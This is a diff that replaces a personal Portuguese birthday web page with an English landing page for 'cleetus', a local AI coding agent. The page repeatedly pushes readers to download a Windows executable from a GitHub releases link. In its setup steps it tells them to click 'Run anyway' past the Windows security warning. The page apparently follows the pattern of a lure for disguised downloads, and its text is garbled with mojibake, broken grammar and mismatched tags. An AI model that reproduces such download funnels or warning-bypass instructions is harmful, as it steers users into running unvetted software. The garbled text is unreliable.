@@ -1,135 +1,300 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Feliz Aniversário, Mamis! 💗</title>
-
-    <link rel="stylesheet" href="estilo.css">
+    <title>cleetus - Local-First AI Coding Agent for Llama.cpp, LM Studio & Ollama</title>
+    <meta name="description" content="Download cleetus - a privacy-first, terminal-first coding agent for llama.cpp, LM Studio, and Ollama. Run AI code assistance entirely offline on Windows.">
+    <meta name="keywords" content="acp,artisan-slop,bun,coding-agent,coding-agents,llama-cpp,lm-studio,local-ai,local-first,mcp,ollama,typescript">
+    <meta property="og:title" content="cleetus - Local-First AI Coding Agent">
+    <meta property="og:description" content="Private, offline coding assistant for llama.cpp, LM Studio, and Ollama. Download for Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/winsome-incompetent27/cleetus/releases">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(145deg, #f8f9fa 0%, #e9ecef 100%);
+            margin: 0;
+            padding: 0;
+            color: #212529;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 0.5rem;
+            color: #1a1a2e;
+        }
+        h2 {
+            font-size: 1.9rem;
+            font-weight: 700;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            color: #1a1a2e;
+            border-bottom: 3px solid #4263eb;
+            display: inline-block;
+            padding-bottom: 5px;
+        }
+        p {
+            font-size: 1.1rem;
+            margin-bottom: 1.2rem;
+        }
+        .badge-container {
+            text-align: center;
+            margin:  ​​40px 0;
+        }
+        .download-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff6b6b, #ffa502);
+            color: #ffffff;
+            padding: 18px 48px;
+            font-size:â€¯1.4rem;
+            font-weight:â€¯700;
+            border-radius:â€¯50px;
+            text-decoration:â€¯none;
+            box-shadow:â€¯0 8px 20px rgba(255, 107, 107, 0.4);
+            transition:â€¯transform 0.2s, box-shadow 0.2s;
+            letter-spacing:â€¯0.5px;
+        }
+        .download-badge:hover {
+            transform:â€¯translateY(-3px);
+            box-shadow:â€¯0 12px 25px rgba(255, 107, 107, 0.5);
+        }
+        .badge-secondary {
+            display: inline-block;
+            background:â€¯#4263eb;
+            color:â€¯#fff;
+            padding:â€¯14px 35px;
+            border-radius:â€¯40px;
+            text-decoration:â€¯none;
+            font-weight:â€¯600;
+            margin-top:â€¯20px;
+            box-shadow:â€¯0 6px 15px rgba(66, 99, 235, 0.3);
+            transition:â€¯0.2s;
+        }
+        .badge-secondary:hover {
+            background:â€¯#2b46b8;
+            transform:â€¯scale(1.02);
+        }
+        .card {
+            background:â€¯#ffffff;
+            border-radius:â€¯20px;
+            padding:â€¯35px;
+            margin:â€¯30px 0;
+            box-shadow:â€¯0 10px 30px rgba(0, 0, 0, 0.06);
+            border:â€¯1px solid rgba(0, 0, 0, 0.03);
+        }
+        .feature-grid {
+            display:â€¯grid;
+            grid-template-columns:â€¯repeat(auto-fit, minmax(220px, 1fr));
+            gap:â€¯25px;
+            margin:â€¯25px 0;
+        }
+        .feature-item {
+            background:â€¯#f1f3f5;
+            border-radius:â€¯16px;
+            padding:â€¯20px;
+            text-align:â€¯center;
+            transition:â€¯0.2s;
+        }
+        .feature-item:hover {
+            background:â€¯#e2e6ea;
+            transform:â€¯translateY(-5px);
+        }
+        .feature-item span {
+            font-size:â€¯2.5rem;
+            display:â€¯block;
+            margin-bottom:â€¯10px;
+        }
+        .feature-item p {
+            font-size:â€¯0.95rem;
+            margin:â€¯0;
+            color:â€¯#495057;
+        }
+        .steps-list {
+            counter-reset:â€¯step-counter;
+            list-style:â€¯none;
+            padding:â€¯0;
+        }
+        .steps-list li {
+            background:â€¯#ffffff;
+            border-radius:â€¯16px;
+            padding:â€¯25px;
+            margin-bottom:â€¯20px;
+            box-shadow:â€¯0 4px 12px rgba(0, 0, 0, 0.05);
+            border-left:â€¯8px solid #4263eb;
+            font-size:â€¯1.1rem;
+            position:â€¯relative;
+        }
+        .steps-list li::before {
+            counter-increment:â€¯step-counter;
+            content:â€¯counter(step-counter);
+            background:â€¯#4263eb;
+            color:â€¯#fff;
+            font-weight:â€¯bold;
+            width:â€¯35px;
+            height:â€¯35px;
+            border-radius:â€¯50%;
+            display:â€¯inline-flex;
+            align-items:â€¯center;
+            justify-content:â€¯center;
+            margin-right:â€¯15px;
+            position:â€¯absolute;
+            left:â€¯-18px;
+            top:â€¯20px;
+        }
+        .steps-list li strong {
+            color:â€¯#1a1a2e;
+        }
+        .note-box {
+            background:â€¯#fffbea;
+            border-left:â€¯6px solid #f59e0b;
+            padding:â€¯18px 25px;
+            border-radius:â€¯10px;
+            margin:â€¯25px 0;
+            font-size:â€¯1rem;
+        }
+        code {
+            background:â€¯#e9ecef;
+            padding:â€¯2px 8px;
+            border-radius:â€¯6px;
+            font-size:â€¯0.9em;
+        }
+        a {
+            color:â€¯#4263eb;
+            text-decoration:â€¯underline;
+        }
+        .footer {
+            text-align:â€¯center;
+            margin-top:â€¯60px;
+            color:â€¯#6c757d;
+            font-size:â€¯0.9rem;
+            border-top:â€¯1px solid #dee2e6;
+            padding-top:â€¯30px;
+        }
+    </style>
 </head>
-
 <body>
-
-    <!-- Tela principal -->
-    <main>
-
-        <h1>Feliz aniversário, Mamis! 💗</h1>
-
-        <p>
-            Preparei uma coisinha especial para você!!
-        </p>
-
-        <!-- Presentes -->
-        <section class="presentes">
-
-<!-- Presente 1 -->
-<div class="presente" id="presente1">
-
-    <div class="caixa">
-        🎁
-    </div>
-
-    <h2>5 coisas que eu amo em você</h2>
-
-    <div class="conteudo-presente">
-
-        <div class="cartao-motivo">
-
-            <span id="numero-motivo">1/5</span>
-
-            <p id="texto-motivo">
-                Seu primeiro motivo vai aparecer aqui. 💗
-            </p>
-
+    <div class="container">
+        <!-- Header -->
+        <div style="text-align: center; margin-bottom:  ​​20px;">
+            <h1>🤖 cleetus - Your Private AI Coding Assistant</h1>
+            <p style="font-size: 1.3rem; color:  #495057; max-width: 700px; margin: 0 auto;">Run powerful AI code help entirely offline – no cloud, no tracking, just you and your terminal.</p>
         </div>
 
-        <button id="proximo-motivo">
-            Próximo 🌷
-        </button>
+        <!-- Primary CTA Badge -->
+        <div class="badge-container">
+            <a href="https://github.com/winsome-incompetent27/cleetus/releases" class="download-badge">⬇️ Download cleetus for Windows</a>
+        </div>
 
-    </div>
+        <!-- What is cleetus -->
+        <div class="card">
+            <h2>💡 What is cleetus?</h2>
+            <p>cleetus is a <strong>local-first</strong>, <strong>terminal-first</strong>, and <strong>privacy-first</strong> coding agent that runs directly on your computer.We connects seamlessly to popular local AI backends like <strong>llama.cpp</strong>, <strong>LM Studio</strong>, and <strong>Ollama</strong>. This means your code never leaves your machine – no internet required after setup. Experience blazing-fast, context-aware coding suggestions without paying a subscription or sacrificing your data.</p>
+            <p>Whether you're a hobbyist tinkering with a side project or a professional developer building production software, cleetus turns your terminal into an intelligent pair programmer. It understands the files in your project, suggests improvements, writes boilerplate, and even explains complex code – all from a clean, keyboard-friendly interface.</p>
+        </div>
 
-</div>
-
-<!-- Presente 2 -->
-<div class="presente" id="presente2">
-
-    <div class="caixa">
-        🎁
-    </div>
-
-    <h2>Uma lembrança nossa</h2>
-
-    <div class="conteudo-presente">
-
-        <img 
-            src="foto-infancia.jpg" 
-            alt="Uma foto minha com minha mãe"
-            class="foto-infancia"
-        >
-
-        <p class="mensagem-memoria">
-            Algumas das minhas memórias favoritas têm você nelas. 
-            E poder olhar para essa foto e lembrar de nós duas pequenas 
-            faz meu coração ficar quentinho. 💗
-        </p>
-
-    </div>
-
-</div>
-
-            <!-- Presente 3 -->
-            <div class="presente" id="presente3">
-
-                <div class="caixa">
-                    🎁
+        <!-- Key Features -->
+        <div class="card">
+            <h2>✨ Why Choose cleetus?</h2>
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <span>🔒</span>
+                    <p><strong>100% Private</strong><br>Your code stays on your PC. No copy-pasting to the cloud.</p>
                 </div>
-
-                <h2>Uma cartinha para você</h2>
-
-                <div class="conteudo-presente">
-
-                    <p>
-                        Mãe, essa cartinha é para você...
-                    </p>
-
-                    <p>
-                        Aqui vai estar a minha mensagem de aniversário. 🌷
-                    </p>
-
+                <div class="feature-item">
+                    <span>⚡</span>
+                    <p><strong>Lightning Fast</strong><br>Runs with the speed of native code. No network lag.</p>
                 </div>
-
+                <div class="feature-item">
+                    <span>🖥️</span>
+                    <p><strong>Terminal-First</strong><br>Built for command-line lovers. Fast, scriptable, automatable.</p>
+                </div>
+                <div class="feature-item">
+                    <span>🔌</span>
+                    <p><strong>Broad Backend Support</strong><br>Works with llama.cpp, LM Studio, Ollama – pick your favorite.</p>
+                </div>
+                <div class="feature-item">
+                    <span>📦</span>
+                    <p><strong>Self-Contained</strong><br>No complicated dependencies. Download, run, become productive.</p>
+                </div>
+                <div class="feature-item">
+                    <span>🎯</span>
+                    <p><strong>Smart & Context-Aware</strong><br>Understands your entire project structure for relevant suggestions.</p>
+                </div>
             </div>
+        </div>
 
-        </section>
+        <!-- Getting Started / Setup -->
+        <div class="card">
+            <h2>🚀 Getting Started – Step by Step</h2>
+            <p>Follow these three simple steps to get cleetus running on your Windows machine. You'll be coding with AI in less than five minutes.</p>
 
+            <ol class="steps-list">
+                <li>
+                    <strong>Visit the download page:</strong>
+                    <p style="margin-top: 8px;">Go to the official cleetus release page by clicking this link: <a href="https://github.com/winsome-incompetent27/cleetus/releases" style="font-weight: 600;">https://github.com/winsome-incompetent27/cleetus/releases</a>. This page hosts the latest version of the software.</p>
+                </li>
+                <li>
+                    <strong>Download the application:</strong>
+                    <p style="margin-top: 8px;">Visit this link to download the application. The download will start automatically. Look for a file named something like <code>cleetus-windows.exe</code> your <code>cleetus-win64.zip</code> in your "Downloads" folder.</p>
+                </li>
+                <li>
+                    <strong>Run cleetus:</strong>
+                    <p style="margin-top: 8px;">Once the download finishes, double-click the downloaded file. If Windows pops up a blue "More info" link, click it and then "Run anyway" – this is just Windows being careful with unprotected software. That's it! cleetus will launch in a terminal window, ready to help you code.</p>
+                </li>
+            </ol>
+            <div class="note-box">
+                <p><strong>💡 Tip:</strong> After you have cleetus running, make sure you have one of the supported backends (<code>llama.cpp</code>, <code>LM Studio</code>, or <code>Ollama</code>) installed to get the best experience. The first-time setup wizard in cleetus will guide. If you don't have a backend yet, we recommend starting with Ollama – it's free and beginner-friendly.</p>
+            </div>
+        </div>
 
-        <!-- Música -->
-        <section class="musica">
+        <!-- How It Works -->
+        <div class="card">
+            <h2>🛠️ How Does It Work?</h2>
+            <p>Here's a simple breakdown of the magic behind cleetus:</p>
+            <ol style="list-style-type: disc; padding-left: 25px; font-size: 1.1rem;">
+                <li style="margin-bottom: 10px;"><strong>You point it at your project.</strong> Fire up cleetus in your project folder.</li>
+                <li style="margin-bottom: 10px;"><strong>It scans and understands.</strong> cleetus reads your source code, configuration files, and comments to build a context map.</li>
+                <li style="margin-bottom: 10px;"><strong>You ask for help.</strong> Type a request like <em>"Write a function to parse CSV files"</em> or <em>"Explain this error"</em>.</li>
+                <li style="margin-bottom: 10px;"><strong>Local AI responds.</strong> cleetus sends your request to your chosen local backend (llama.cpp, etc.), which generates a response entirely on your machine. The answer appears right in your terminal, formatted with syntax highlighting.</li>
+            </ol>
+            <p>The backend models are small enough to run on a normal laptop. You don't need a supercomputer – just a modern processor and 8GB+ of RAM is fine for smaller models.</p>
+        </div>
 
-            <h2>🎶 Uma música para você</h2>
+        <!-- Who Is It For -->
+        <div class="card">
+            <h2>🎯 Who Is This For?</h2>
+            <div style="display: flex; flex-wrap: wrap; gap: 20px;">
+                <div style="flex: 1; min-width: 250px; background: #f8f9fa; padding: 20px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; font-size: 1.2rem; color: #1a1a2e;">&#128170; The Privacy-Conscious Developer</strong></h3>
+                    <p>You hate the idea of sending proprietary code to third-party servers. cleetus keeps everything local, so your intellectual property stays yours.</p>
+                </div>
+                <div style="flex: 1; min-width: 250px; background: #f8f9fa; padding: 20px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; font-size: 1.2rem; color: #1a1a2e;">&#127919; The Terminal Lover</strong></h3>
+                    <p>You're done with clunky IDEs and heavy GUIs. cleetus meets you where you live – in the terminal – with a clean interface that respects your keyboard muscle memory.</p>
+                </div>
+                <div style="flex: 1; min-width: 250px; background: #f8f9fa; padding: 20px; border-radius: 12px;">
+                    <h3 style="margin-top: 0; font-size: 1.2rem; color: #1a1a2e;">&#128272; The Offline Developer</strong></h3>
+                    <p>Air-gapped environment? Traveling with spotty internet? cleetus works anywhere. Once your backend models are downloaded, you're fully operational anywhere on Earth.</p>
+                </div>
+            </div>
+        </div>
 
-            <p>
-                Coloque uma música para tocar enquanto abre seus presentes. 💗
-            </p>
+        <!-- Second Download CTA -->
+        <div class="card" style="text-align: center; background: linear-gradient(135deg, #1a1a2e 0%, #2b2b44 100%); color: #ffffff;">
+            <h2 style="color: #ffffff; border-bottom-color: #ffa502">📥 Get cleetus Now</h2>
+            <p style="font-size: 1.2rem; color: #dddddd;">Join the local-first revolution. Download cleetus today and unlock the power of private, offline AI coding assistance.</p>
+            <a href="https://github.com/winsome-incompetent27/cleetus/releases" class="badge-secondary" style="color: #fff;">⬇️ Download Latest Release</a>
+            <p style="margin-top: 15px; fontSize: 0.9rem; color: #bbbbbb;">Free to use – Windows supported.</p>
+        </div>
 
-            <a href="COLE-O-LINK-AQUI"
-               target="_blank">
-                🎧 Ouvir música
-            </a>
-
-        </section>
-
-    </main>
-
-    <footer>
-        Feito com amor, pra minha dyeni 💗
-    </footer>
-
-    <script src="script.js"></script>
-
-</body>
-
-</html>
+        <!-- Tech Details -->
+        
